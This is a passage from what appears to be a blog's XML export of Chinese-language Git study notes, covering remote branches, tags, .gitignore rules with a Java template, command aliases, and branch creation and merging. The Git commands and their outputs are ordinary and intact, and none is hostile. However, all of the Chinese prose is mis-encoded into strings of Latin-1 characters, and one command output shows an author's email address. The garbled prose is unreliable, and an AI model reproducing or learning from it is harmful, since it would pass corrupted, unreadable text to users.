<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch dev</span></span><br><span class="line">Switched to branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge Axin --no-ff -m <span class="string">"é˜¿ä¿¡å®Œæˆç”¨æˆ·ä¿¡æ¯"</span></span></span><br><span class="line">Merge made by the 'ort' strategy.</span><br><span class="line"> xin.data | 0</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 xin.data</span><br></pre></td></tr></table></figure>

<p>å°†<code>dev</code>åˆ†æ”¯æ¨é€åˆ°è¿œç«¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch dev</span></span><br><span class="line">Switched to branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin dev</span></span><br></pre></td></tr></table></figure>

<p>å®é™…æƒ…å†µä¸­ï¼Œ<code>master</code>åˆ†æ”¯æ˜¯ä¸»åˆ†æ”¯ï¼Œå› æ­¤è¦æ—¶åˆ»ä¸è¿œç¨‹åŒæ­¥ï¼Œ<code>dev</code>åˆ†æ”¯æ˜¯å¼€å‘åˆ†æ”¯ï¼Œå›¢é˜Ÿæ‰€æœ‰æˆå‘˜éƒ½éœ€è¦åœ¨ä¸Šé¢å·¥ä½œï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦ä¸è¿œç¨‹åŒæ­¥ï¼Œ<code>bug</code>åˆ†æ”¯åªç”¨äºåœ¨æœ¬åœ°ä¿®å¤<code>bug</code>ï¼Œå°±æ²¡å¿…è¦æ¨åˆ°è¿œç¨‹äº†ï¼Œé™¤éè€æ¿è¦çœ‹çœ‹ä½ æ¯å‘¨åˆ°åº•ä¿®å¤äº†å‡ ä¸ª<code>bug</code>ï¼Œæˆ–è€…è¯´ä½ ä¿®å¤<code>bug</code>ä¹Ÿä½œä¸ºæ•ˆç»©çš„ä¸€éƒ¨åˆ†ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼›<code>feature</code>åˆ†æ”¯æ˜¯å¦æ¨åˆ°è¿œç¨‹ï¼Œå–å†³äºä½ æ˜¯å¦å’Œä½ çš„å°ä¼™ä¼´åˆä½œåœ¨ä¸Šé¢å¼€å‘ã€‚</p>
<p>ç„¶ååœ¨<code>Linux</code>ä¸Šé¢çš„ç”¨æˆ·åªéœ€è¦å…‹éš†è¯¥ä»“åº“æ—¢å¯ä»¥çœ‹åˆ°è¿™è¾¹çš„æäº¤äº†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/YaleXin/cooperation.git</span></span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡é»˜è®¤æƒ…å†µä¸‹åªä¼šæ‹‰å–è¿œç«¯ä»“åº“çš„<code>master</code>åˆ†æ”¯</p>
<p>å¦‚æœéœ€è¦æ‹‰å–<code>dev</code>åˆ†æ”¯ï¼Œåˆ™éœ€è¦</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev origin/dev</span></span><br></pre></td></tr></table></figure>

<p>å³æ–°å»ºä¸€ä¸ª<code>dev</code>åˆ†æ”¯å…³è”è‡³è¿œç«¯ä»“åº“çš„<code>dev</code>åˆ†æ”¯ã€‚</p>
<p>å½“ç„¶äº†ï¼Œæœ€å¥½åœ¨è¿™è¾¹æ–°å»ºè‡ªå·±çš„åˆ†æ”¯ï¼Œå¹¶ä¸”<strong>å®šæœŸä½¿ç”¨</strong><code>git pull</code>æ›´æ–°<code>dev</code>å’Œ<code>master</code>åˆ†æ”¯ã€‚</p>
<p> å¦‚æœ<code>git pull</code>æç¤º<code>no tracking information</code>ï¼Œåˆ™è¯´æ˜æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯çš„é“¾æ¥å…³ç³»æ²¡æœ‰åˆ›å»ºï¼Œç”¨å‘½ä»¤<code>git branch --set-upstream-to branch-name  origin/branch-name</code>å³å¯ã€‚ </p>
<p><strong>ä¸è¿‡ç”±äº<code>GitHub</code>å¯èƒ½è®¿é—®ä¸æ­£å¸¸ï¼Œå›½å†…å»ºè®®ä½¿ç”¨<code>gitee</code></strong></p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå­¦ä¹ ç¬”è®°ä¹‹æ ‡ç­¾ç®¡ç†</title>
    <url>/2022/02/10/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>ä¹¦æ¥ä¸Šå›ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»<code>Git</code>çš„æ ‡ç­¾ç®¡ç†ã€‚</p>
<a id="more"></a>

<p> æ ‡ç­¾ç”¨äºæ ‡è®°æŸä¸€æäº¤ç‚¹ï¼Œå”¯ä¸€ç»‘å®šä¸€ä¸ªå›ºå®šçš„<code>commitId</code>ï¼Œç›¸å½“äºä¸ºè¿™æ¬¡æäº¤è®°å½•æŒ‡å®šä¸€ä¸ªåˆ«åï¼Œæ–¹ä¾¿æå–æ–‡ä»¶ï¼Œå¦åˆ™ä¼šå‡ºç°ï¼š</p>
<p>â€œé˜¿ä¿¡ï¼Œå¿«å°†å‰äº›å¤©çš„ç‰ˆæœ¬æ‰“åŒ…å‘å¸ƒï¼Œæäº¤<code>ID</code>ä¸ºé©¬å†¬æ¢…â€</p>
<p>â€œå¥½çš„ï¼Œé©¬ä»€ä¹ˆæ¢…â€</p>
<p>â€œé©¬å†¬æ¢…â€</p>
<p>â€œä»€ä¹ˆå†¬æ¢…ï¼Ÿâ€</p>
<p>â€œæ˜å¤©åˆ«æ¥ä¸Šç­äº†ï¼â€</p>
<p>â€œâ€¦â€¦â€¦â€¦â€</p>
<hr>
<p>æ ‡ç­¾å®é™…ä¸Šå°±æ˜¯æŒ‡å‘æŸä¸ª<code>commit</code>çš„æŒ‡é’ˆï¼Œåªä¸è¿‡è¯¥æŒ‡é’ˆä¸ä¼šç§»åŠ¨ã€‚</p>
<h2 id="åˆ›å»ºæ ‡ç­¾"><a href="#åˆ›å»ºæ ‡ç­¾" class="headerlink" title="åˆ›å»ºæ ‡ç­¾"></a>åˆ›å»ºæ ‡ç­¾</h2><p>è¦æ‰“æ ‡ç­¾ä¹‹å‰ï¼Œé¦–å…ˆåˆ‡æ¢åˆ°éœ€è¦æ‰“æ ‡ç­¾çš„åˆ†æ”¯ä¸Šï¼š </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p> è¾“å…¥å‘½ä»¤<code>git tag tag-name</code>å°±å¯ä»¥æ‰“ä¸€ä¸ªæ–°æ ‡ç­¾ï¼š </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git tag v1.0</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç”¨å‘½ä»¤<code>git tag</code>æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag</span><br><span class="line">v1.0</span><br></pre></td></tr></table></figure>

<p>é»˜è®¤æ ‡ç­¾æ˜¯æ‰“åœ¨æœ€æ–°æäº¤çš„<code>commit</code>ä¸Šçš„ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æ‰“åœ¨å†å²æäº¤ä¸Šï¼Œåˆ›å»ºæ ‡ç­¾æ—¶åŠ ä¸Šå¯¹åº”çš„<code>commitId</code>å³å¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git tag v0.9 commitId</span></span><br></pre></td></tr></table></figure>

<p>ç”¨<code>show</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ ‡ç­¾çš„è¯¦ç»†ä¿¡æ¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git show v1.0</span></span><br><span class="line">commit 274515d79ec8898dd098102681864fd862d68978 (HEAD -&gt; master, tag: v1.0, dev)</span><br><span class="line">Merge: e167bc0 f7f1ef6</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 16:54:01 2022 +0800</span><br><span class="line"></span><br><span class="line">    merge by no-ff</span><br></pre></td></tr></table></figure>

<h2 id="æ“ä½œæ ‡ç­¾"><a href="#æ“ä½œæ ‡ç­¾" class="headerlink" title="æ“ä½œæ ‡ç­¾"></a>æ“ä½œæ ‡ç­¾</h2><p>æ¨é€æŸä¸ªæ ‡ç­¾åˆ°è¿œç¨‹ï¼Œä½¿ç”¨å‘½ä»¤<code>git push origin tag-name</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git  push origin v1.0</span></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶äº†ï¼Œå¦‚æœæƒ³è¦ä¸€æ¬¡æ€§æ¨é€å¤šä¸ªæ ‡ç­¾ä¹Ÿå¯ä»¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin --tags</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦åˆ é™¤æ ‡ç­¾ï¼Œå‡å¦‚<code>-d</code>å‚æ•°å³å¯ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git tag -d v1.0</span></span><br></pre></td></tr></table></figure>

<p> ä¸è¿‡ä¸Šè¿°å‘½ä»¤æ˜¯åˆ é™¤æœ¬åœ°çš„æ ‡ç­¾ï¼Œå¦‚æœè¦åˆ é™¤è¿œç«¯çš„æ ‡ç­¾ï¼Œè¦å…ˆåˆ é™¤æœ¬åœ°åˆ™æ ¼å¼ä¸º<code>git push &lt;remote_name&gt; :refs/tags/&lt;tag_name&gt;</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin :refs/tags/v1.0</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå­¦ä¹ ç¬”è®°ä¹‹Gité…ç½®</title>
    <url>/2022/02/11/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>ä¹¦æ¥ä¸Šå›ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»<code>Git</code>çš„ä¸€äº›å…¶ä»–é…ç½®é€‰é¡¹ã€‚</p>
<a id="more"></a>

<h2 id="å¿½ç•¥éƒ¨åˆ†æ–‡ä»¶"><a href="#å¿½ç•¥éƒ¨åˆ†æ–‡ä»¶" class="headerlink" title="å¿½ç•¥éƒ¨åˆ†æ–‡ä»¶"></a>å¿½ç•¥éƒ¨åˆ†æ–‡ä»¶</h2><p>ç»å¸¸ä½¿ç”¨ä¸€äº›æ¡†æ¶éƒ½è§é¡¹ç›®çš„å°ä¼™ä¼´åº”è¯¥éƒ½ä¼šå‘ç°ï¼Œä¸€äº›ä½¿ç”¨<code>git</code>çš„æ¡†æ¶åœ¨ç”Ÿæˆé¡¹ç›®çš„æ—¶å€™ä¸€æ¬éƒ½ä¼šç”Ÿæˆä¸€ä¸ª<code>.gitignore</code>æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é‡Œè¾¹æè¿°çš„æ˜¯æˆ‘ä»¬è¦æ±‚<code>Git</code>å¿½ç•¥çš„æ–‡ä»¶ï¼Œæ¯æ¬¡æäº¤å’Œæ¨é€çš„æ—¶å€™<code>Git</code>å°±ä¸ä¼šè®°å½•è¿™äº›æ–‡ä»¶ã€‚</p>
<p>ä»€ä¹ˆæ—¶å€™éœ€è¦ç”¨è¿™ä¸ªå‘¢ï¼Ÿ</p>
<ul>
<li><p>ä½ çš„é…ç½®æ–‡ä»¶ä¸­æœ‰æ•°æ®åº“å¯†ç ï¼Œä½ ä¸æƒ³æ³„éœ²å‡ºå»</p>
</li>
<li><p>ä¾èµ–åŒ…è¿‡å¤šï¼Œç‰¹åˆ«æ˜¯éƒ¨åˆ†å‰ç«¯æ¡†æ¶ï¼</p>
</li>
</ul>
<p><img src="https://qiniu.yalexin.top/difference.jpg" alt="1644563191198"></p>
<ul>
<li>éƒ¨åˆ†æ“ä½œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶</li>
<li>ç­‰ç­‰</li>
</ul>
<h3 id="ç¼–å†™è§„èŒƒ"><a href="#ç¼–å†™è§„èŒƒ" class="headerlink" title="ç¼–å†™è§„èŒƒ"></a>ç¼–å†™è§„èŒƒ</h3><ul>
<li><p>æ‰€æœ‰ç©ºè¡Œæˆ–è€…ä»¥æ³¨é‡Šç¬¦å· <code>ï¼ƒ</code>å¼€å¤´çš„è¡Œéƒ½ä¼šè¢«<code>Git</code> å¿½ç•¥</p>
</li>
<li><p>å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„<code>glob</code>æ¨¡å¼åŒ¹é…</p>
</li>
<li><p>åŒ¹é…æ¨¡å¼æœ€åè·Ÿæ–œæ (<code>/</code>)è¯´æ˜è¦å¿½ç•¥çš„æ˜¯ç›®å½•</p>
</li>
<li><p>è¦å¿½ç•¥æŒ‡å®šæ¨¡å¼ä»¥å¤–çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥åœ¨æ¨¡å¼å‰åŠ ä¸Šæ„Ÿå¹å·(<code>!</code>)è¿›è¡Œå–å</p>
</li>
</ul>
<blockquote>
<p>æ‰€è°“çš„<code>glob</code>æ¨¡å¼æ˜¯æŒ‡<code>shell</code>æ‰€ä½¿ç”¨çš„ç®€åŒ–äº†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…è§„åˆ™å¦‚ä¸‹ï¼š<br> <code>&quot;*&quot;</code>ï¼šæ˜Ÿå·åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦<br> <code>[]</code>ï¼šåŒ¹é…ä»»ä½•ä¸€ä¸ªåˆ—åœ¨æ–¹æ‹¬å·ä¸­çš„å­—ç¬¦ï¼Œå¦‚[ab]åŒ¹é…aæˆ–è€…åŒ¹é…b<br> <code>&quot;?&quot;</code>ï¼šé—®å·åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦<br> <code>[n-m]</code>ï¼šåŒ¹é…æ‰€æœ‰åœ¨è¿™ä¸¤ä¸ªå­—ç¬¦èŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚[0-9]è¡¨ç¤ºåŒ¹é…æ‰€æœ‰0åˆ°9çš„æ•°å­—</p>
</blockquote>
<h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><p>é™„ä¸Š<code>Java</code>å¼€å‘é€šç”¨æ¨¡æ¿</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">java</span></span><br><span class="line">*.class</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">package file</span></span><br><span class="line">*.war</span><br><span class="line">*.ear</span><br><span class="line">*.zip</span><br><span class="line">*.tar.gz</span><br><span class="line">*.rar</span><br><span class="line"><span class="meta">#</span><span class="bash">maven ignore</span></span><br><span class="line">target/</span><br><span class="line">build/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">eclipse ignore</span></span><br><span class="line">.settings/</span><br><span class="line">.project</span><br><span class="line">.classpatch</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Intellij idea</span></span><br><span class="line">.idea/</span><br><span class="line">/idea/</span><br><span class="line">*.ipr</span><br><span class="line">*.iml</span><br><span class="line">*.iws</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> temp file</span></span><br><span class="line">*.log</span><br><span class="line">*.cache</span><br><span class="line">*.diff</span><br><span class="line">*.patch</span><br><span class="line">*.tmp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> system ignore</span></span><br><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¸æ’é™¤.gitignore</span></span><br><span class="line">!.gitignore</span><br></pre></td></tr></table></figure>

<p>æˆ‘æ˜¯å°ç™½å•Šï¼å…¶ä»–é¡¹ç›®æ€ä¹ˆåŠå•Šï¼Ÿä¸æ‡‚å†™è¯¥æ–‡ä»¶å•Šï¼</p>
<p>æ”¾å¿ƒï¼Œ<code>GitHub</code>å·²ç»å¸®æˆ‘ä»¬å†™äº†å¾ˆå¤šæ¨¡æ¿äº†ï¼Œæˆ‘ä»¬æ‹¿è¿‡æ¥æŠ„ç­”æ¡ˆå°±è¡Œäº†ï¼š <a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a>ã€‚</p>
<p><strong>è®°å¾—æ–°å»ºé¡¹ç›®åç¬¬ä¸€æ—¶é—´å†™å¥½è¯¥æ–‡ä»¶å¹¶æäº¤ï¼</strong> å¦‚æœæŸäº›æ–‡ä»¶å·²ç»è¢«çº³å…¥äº†ç‰ˆæœ¬ç®¡ç†ä¸­ï¼Œåˆ™ä¿®æ”¹<code>.gitignore</code>æ˜¯æ— æ•ˆçš„ã€‚ </p>
<p>å¦‚æœæˆ‘ä»¬æƒ³æ·»åŠ çš„æ–‡ä»¶è¢«å†™è¿›äº†è§„åˆ™ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>!</code>å°†å…¶æ’é™¤ï¼Œä¹Ÿå¯ä»¥åœ¨<code>add</code>çš„æ—¶å€™åŠ å…¥<code>-f</code>å¼ºåˆ¶æ·»åŠ ã€‚</p>
<h3 id="å…¨å±€-gitignoreæ–‡ä»¶"><a href="#å…¨å±€-gitignoreæ–‡ä»¶" class="headerlink" title="å…¨å±€.gitignoreæ–‡ä»¶"></a>å…¨å±€.gitignoreæ–‡ä»¶</h3><p>ä¸Šè¿°æ‰€è¯´çš„æ˜¯é¡¹ç›®çº§åˆ«çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªå…¨å±€çº§åˆ«çš„ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global core.excludesfile  filename</span></span><br></pre></td></tr></table></figure>

<p><code>filename</code>åŒ…å«è·¯å¾„åã€‚</p>
<h2 id="ä½¿ç”¨å‘½ä»¤åˆ«å"><a href="#ä½¿ç”¨å‘½ä»¤åˆ«å" class="headerlink" title="ä½¿ç”¨å‘½ä»¤åˆ«å"></a>ä½¿ç”¨å‘½ä»¤åˆ«å</h2><p>ç†Ÿæ‚‰<code>Linux</code>å‘½ä»¤çš„åŒå­¦åº”è¯¥éƒ½çŸ¥é“<code>Linux</code>æ”¯æŒå°†å‘½ä»¤åˆ«ååŒ–ï¼Œ<code>Git</code>ä¹Ÿæ”¯æŒè¯¥åŠŸèƒ½ï¼Œä¸ºæˆ‘ä»¬æå‡æ•ˆç‡ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•ä¸º</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.newName oldName</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.swc switch</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.cmt commit</span></span><br></pre></td></tr></table></figure>

<p>ç¨å¾®å¤æ‚çš„ä¹Ÿå¯ä»¥å®šåˆ¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global alias.log1 <span class="string">"log --graph --pretty=oneline --abbrev-commit"</span></span></span><br></pre></td></tr></table></figure>

<p>å¬è¯´æœ‰äººä¸§å¿ƒç—…ç‹‚åœ°æŠŠ<code>lg</code>é…ç½®æˆäº†ï¼š </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit"</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.yalexin.top/log.png" alt="1644566150616"></p>
<p>æœç„¶<strong>äººç±»çš„æ‡’æƒ°æ¨åŠ¨äº†ç¤¾ä¼šç§‘æŠ€çš„è¿›æ­¥</strong> ã€‚å¯æˆ‘è¿˜æƒ³å¤šå­¦ç‚¹å¤–è¯­ï¼ŒçœŸçš„ï¼ï¼</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå­¦ä¹ ç¬”è®°ä¹‹åˆ†æ”¯ç®¡ç†</title>
    <url>/2022/02/09/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>ä¹¦æ¥ä¸Šå›ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»<code>Git</code>çš„åˆ†æ”¯ç®¡ç†æ“ä½œã€‚</p>
<p><code>Git</code>çš„åˆ†æ”¯åŠŸèƒ½ä¸ºæˆ‘ä»¬å›¢é˜Ÿåˆ†å·¥æä¾›äº†æ–¹ä¾¿ï¼Œå¹¶ä¸”æ¯ä¸€ä¸ªåˆ†æ”¯åœ¨åˆå¹¶ä¹‹å‰ä¸ä¼šå¯¹å¦å¤–çš„åˆ†æ”¯äº§ç”Ÿå½±å“ï¼š</p>
<a id="more"></a>

<p><img src="https://qiniu.yalexin.top/branch.drawio.png" alt></p>
<p>ä¸åˆ†æ”¯ç®¡ç†ç›¸å…³çš„å‘½ä»¤ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>git branch (branchname)</td>
<td>åˆ›å»ºåˆ†æ”¯</td>
<td>git checkout/switch (branchname)</td>
<td>åˆ‡æ¢åˆ†æ”¯</td>
</tr>
<tr>
<td>git merge (branchname)</td>
<td>åˆå¹¶æŒ‡å®šåˆ†æ”¯</td>
<td>git branch</td>
<td>åˆ—å‡ºæ‰€æœ‰åˆ†æ”¯</td>
</tr>
<tr>
<td>git branch -d (branchname)</td>
<td>åˆ é™¤æŒ‡å®šåˆ†æ”¯</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>Git</code>é»˜è®¤ç»™æˆ‘ä»¬ç”Ÿæˆäº†ä¸€ä¸ª<code>master</code>ä¸»åˆ†æ”¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* master</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¹‹å‰è¯´çš„<code>HEAD</code>æŒ‡å‘å½“å‰ç‰ˆæœ¬ï¼Œä¸¥æ ¼æ¥è¯´æ˜¯æŒ‡å‘<code>master</code>ï¼Œè€Œ<code>master</code>æŒ‡å‘çš„æ˜¯è¯¥åˆ†æ”¯çš„æœ€æ–°æäº¤ï¼Œå› æ­¤<code>HEAD</code>æŒ‡å‘çš„æ˜¯æœ€æ–°æäº¤ï¼Œç†Ÿæ‚‰ç±»<code>C</code>è¯­è¨€çš„æŒ‡é’ˆç›¸å…³çŸ¥è¯†åº”è¯¥å¾ˆå®¹æ˜“ç†è§£è¿™éƒ¨åˆ†å†…å®¹ã€‚</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio2.png" alt></p>
<h2 id="ä½¿ç”¨åˆ†æ”¯"><a href="#ä½¿ç”¨åˆ†æ”¯" class="headerlink" title="ä½¿ç”¨åˆ†æ”¯"></a>ä½¿ç”¨åˆ†æ”¯</h2><h3 id="æ–°å»ºåˆ†æ”¯"><a href="#æ–°å»ºåˆ†æ”¯" class="headerlink" title="æ–°å»ºåˆ†æ”¯"></a>æ–°å»ºåˆ†æ”¯</h3><p>æ–°å»ºä¸€ä¸ªå‰ç«¯åˆ†æ”¯<code>front</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c front</span></span><br><span class="line">Switched to a new branch 'front'</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-c</code>ä»£è¡¨æ–°å»ºä¸€ä¸ªåˆ†æ”¯ <code>switch</code>ä»£è¡¨åˆ‡æ¢åˆ†æ”¯</p>
</blockquote>
<p>ç¡®ä¿å½“å‰æ‰€åœ¨åˆ†æ”¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* front</span><br><span class="line">  master</span><br></pre></td></tr></table></figure>

<p>åœ¨è¯¥åˆ†æ”¯ä¸‹æ–°å»ºæˆ‘ä»¬çš„æ–‡ä»¶<code>front.txt</code>ï¼Œå¹¶æäº¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch front.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add front.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"new front branch"</span></span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å†è½¬å›ä¸»åˆ†æ”¯<code>master</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶æˆ‘ä»¬ä¼šå‘ç°æˆ‘ä»¬ä¹‹å‰æ–°å»ºçš„<code>front.txt</code>æ–‡ä»¶ä¸è§äº†ï¼Œè¿™æ˜¯å› ä¸ºè¯¥æ–‡ä»¶æ˜¯åœ¨<code>front</code>åˆ†æ”¯ä¸‹æäº¤çš„ï¼Œæ­¤æ—¶çš„å‰ç«¯åˆ†æ”¯æ¯”æˆ‘ä»¬çš„ä¸»åˆ†æ”¯â€œæå‰â€ã€‚</p>
<p>åŒæ ·çš„æ–¹æ³•æ–°å»ºä¸€ä¸ªæ¥å£åˆ†æ”¯å¹¶åŠ ä¸€ä¸ªæ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c interface</span></span><br><span class="line">Switched to a new branch 'interface'</span><br><span class="line"><span class="meta">$</span><span class="bash"> touch interface.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add interface.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"new interface branch"</span></span></span><br><span class="line">[interface 824a607] new interface branch</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 interface.txt</span><br><span class="line"><span class="meta"> $</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ä»“åº“æƒ…å†µå¦‚å›¾ï¼š</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio3.png" alt></p>
<h3 id="åˆå¹¶åˆ†æ”¯"><a href="#åˆå¹¶åˆ†æ”¯" class="headerlink" title="åˆå¹¶åˆ†æ”¯"></a>åˆå¹¶åˆ†æ”¯</h3><p>ä¸¤è¾¹çš„äººå‘˜å·¥ä½œéƒ½åšå®Œäº†ï¼Œå°±å¯ä»¥è€ƒè™‘åˆå¹¶äº†ï¼Œæ¯•ç«Ÿä¸€ç›´å•å¹²å•¥äº‹éƒ½å¹²ä¸äº†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge front</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge interface</span></span><br></pre></td></tr></table></figure>

<p>æ„æ€æ˜¯ä¾æ¬¡å°†å½“å‰åˆ†æ”¯ï¼ˆå³<code>master</code>ï¼‰åˆå¹¶åˆ°ç›®æ ‡åˆ†æ”¯ï¼Œæˆ‘ä»¬å°è¯•åˆå¹¶ç¬¬äºŒä¸ªæ—¶å¯èƒ½ä¼šé‡åˆ°ä¸‹é¢çš„æƒ…å†µ</p>
